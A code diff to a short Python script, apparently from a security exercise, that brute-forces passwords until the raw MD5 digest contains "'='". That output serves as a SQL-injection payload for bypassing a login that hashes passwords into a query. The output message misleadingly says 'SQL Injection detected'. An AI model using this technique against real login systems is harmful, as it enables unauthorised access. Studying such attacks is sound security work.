@@ -1,17 +1,14 @@
-from pymd5 import *
-
-target = b"'--'"
-prefix = "'-"
-
-password = ""
-
+from pymd5 import md5
+  
+target = b"'='"
+prefix = "'="
 count = 0
+password = ""
 
 while True:
     count += 1
     password = prefix + str(count)
-    m = md5(password)
-
+    m = md5(password) 
     binaryData = m.digest()
 
     if count % 1000 == 0:
@@ -19,5 +16,6 @@ while True:
 
     if target in binaryData:
         break
+
 print("SQL Injection detected")
-print(passowrd)
+print(password)
